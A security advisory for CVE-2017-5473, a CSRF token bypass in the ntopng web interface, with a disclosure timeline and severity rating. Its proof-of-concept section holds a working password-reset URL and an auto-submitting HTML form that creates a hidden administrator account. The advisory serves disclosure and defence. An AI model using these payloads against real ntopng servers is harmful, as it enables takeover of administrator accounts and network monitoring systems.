@@ -1,0 +1,111 @@
+[+]#####################################################################################
+[+] Credits / Discovery: John Page AKA Hyp3rlinX
+[+] Website: hyp3rlinx.altervista.org
+[+] Source: http://hyp3rlinx.altervista.org/advisories/NTOPNG-CSRF-TOKEN-BYPASS.txt
+[+] ISR: ApparitionSEC
+[+]#####################################################################################
+
+
+
+Vendor:
+============
+www.ntop.org
+
+
+Product:
+====================
+ntopng Web Interface
+v2.4.160627
+
+ntopng is the next generation version of the original ntop, a network
+traffic probe that shows the network usage, similar
+to what the popular top Unix command does. ntopng is based on libpcap and
+it has been written in a portable way in order to
+virtually run on every Unix platform, MacOSX and on Windows as well.
+
+
+Vulnerability Type:
+==================
+CSRF Token Bypass
+
+
+
+CVE Reference:
+================
+CVE-2017-5473
+
+
+
+Security Issue:
+=================
+By simply omitting the CSRF token or supplying arbitrary token values will
+bypass CSRF protection when making HTTP requests,
+to the ntopng web interface. Allowing remote attackers the rights to make
+HTTP requests on an authenticated users behalf, if
+the user clicks an malicious link or visits an attacker webpage etc.
+
+
+Exploit/POC:
+============
+
+1) Change admin password
+http://VICTIM-SERVER:3000/lua/admin/password_reset.lua?csrf=NOT-EVEN-CHECKED&username=admin&new_password=xyz123&confirm_new_password=xyz123
+
+
+2) Add arbitrary
+
+<form action="
+http://VICTIM-SERVER:3000/lua/admin/add_user.lua?csrf=NOT-EVEN-CHECKED"
+method="GET">
+<input type="hidden" name="username"  value="hyp3rlinx">
+<input type="hidden" name="full_name"  value="TheApparitioN">
+<input type="hidden" name="password"  value="abc123">
+<input type="hidden" name="confirm_password"  value="abc123">
+<input type="hidden" name="host_role"  value="administrator">
+<input type="hidden" name="allowed_networks"  value="0.0.0.0/,::/">
+<input type="hidden" name="allowed_interface"  value="HTTP/1.1">
+<script>document.forms[0].submit()</script>
+</form>
+
+
+
+Disclosure Timeline:
+=====================
+Vendor Notification: January 11, 2017
+Vendor acknowledgement: January 12, 2017
+Vendor Fixed Issue
+January 20, 2017 : Public Disclosure
+
+
+
+Network Access:
+===============
+Remote
+
+
+Impact:
+======================
+Information Disclosure
+Privilege Escalation
+
+
+
+Severity:
+===========
+High
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the
+information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author
+prohibits any malicious use of security related information
+or exploits by the author or elsewhere.  All content (c) HYP3RLINX -
+Apparition
